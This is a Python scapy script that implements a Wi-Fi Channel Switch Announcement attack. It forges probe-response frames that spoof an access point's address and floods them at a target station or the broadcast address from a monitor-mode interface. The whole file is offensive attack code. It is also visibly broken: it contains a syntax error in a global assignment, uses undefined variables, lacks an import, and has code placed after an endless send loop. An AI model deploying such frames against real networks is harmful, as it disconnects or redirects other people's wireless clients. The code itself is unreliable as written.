from scapy.all import *
import time
import sys
import argparse
import re

parser = None

def csa_attack(parser):
	if is_broadcast(parser):
		packet = capture_beacon(parser)
		print(packet)
	
	else:
		dot11 = Dot11(type=0, subtype=0x5, addr1=parser.sta, addr2=parser.ap, addr3=parser.ap)
		probe_resp = Dot11ProbeResp(cap=0x1111)
		essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
		csa = Dot11Elt(ID=0x25,len=3,info='\x00\x0b\x01')

		probeRespFrame = RadioTap()/dot11/probe_resp/essid/csa

		print('[*] Start...!!')
		sendp(probeRespFrame, iface=iface, inter=0.004, loop=1)
		dsparam = Dot11Elt(ID=0x3,len=1,info=b'\x28')

		csa = Dot11Elt(ID=0x25,len=3,info=b'\x00\xff\x01')

		frame = RadioTap()/dot11/beacon/essid/csa


def is_broadcast(parser):
	if parser.casting == "broadcast":
		return True
	else:
		return False

def capture_beacon(parser):
	return sniff(iface=parser.interface, prn = PacketHandler)

def PacketHandler(packet):
	if packet.haslayer(Dot11Beacon):
		dot11 = packet.getlayer(Dot11)
		if dot11.addr1 == parser.ap:
			print(packet)
			return packet

class PARSER:
	def __init__(self, opts):
		self.help = self.help(opts.help)
		self.interface = self.interface(opts.interface)
		self.channel = self.channel(opts.channel)
		self.ap = self.mac(opts.ap)

		self.casting = self.cast(opts.cast)

		if self.casting == "unicast":
			self.sta = self.mac(opts.sta)

		
		self.aggressive = opts.aggressive
	
	def help(self, _help):
		if _help:
			print("HELPPPPPP")

	def mac(self, mac_address):
		if mac_address == None:
			print("No MAC address Given")
			exit(-1)
	
		if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac_address):
			return mac_address.lower()
		else:
			print("Invalid MAC Address Given")
			exit(-1)

	def channel(self, ch):
		retval = list(range(1,164))
		if ch:
			if ch in retval:
				return ch
			else:
				print("Invalid Channel Given.")
		else:
			print("No Channel Given")
			exit(-1)
	
	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		if iface:
			ifaces = getNICnames()
			if iface in ifaces:
				if confirmMon(iface):
					return iface
				else:
					print("Interface Not In Monitor Mode [%s]" % (iface))
					exit(-1)
			else:
				print("Interface Not Found. [%s]" % (iface))
				exit(-1)
		else:
			print("Interface Not Provided. Specify an Interface!")
			exit(-1)

	def cast(self, casting):
		if casting == "unicast" or casting == "broadcast":
			return casting
		else:
			print("Only unicast or broadcast")
			exit(-1)


if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help=False)

	parser.add_argument('-h', '--help', dest='help', default=False, action="store_true")
	
	parser.add_argument('-i', '--interface', dest='interface', default="", type=str)
	parser.add_argument('-c', '--channel', dest='channel', default=0, type=int)
	parser.add_argument('-a', '--accesspoint', dest='ap', default="", type=str)
	parser.add_argument('-s', '--station', dest='sta', default="", type=str)
	parser.add_argument('-v', '--ssid', dest='ssid', default="", type=str)

	parser.add_argument('-d', '--casting', dest='cast', default="broadcast", type=str)
	
	parser.add_argument('--aggressive', dest='aggressive', default=False, type=bool)

	options = parser.parse_args()
	global parser = PARSER(options)
	#print(f"interface: {parser.interface}\nChannel: {parser.channel}\nAP: {parser.ap}\nSTA: {parser.sta}\ncasting: {parser.casting}")

	csa_attack(parser)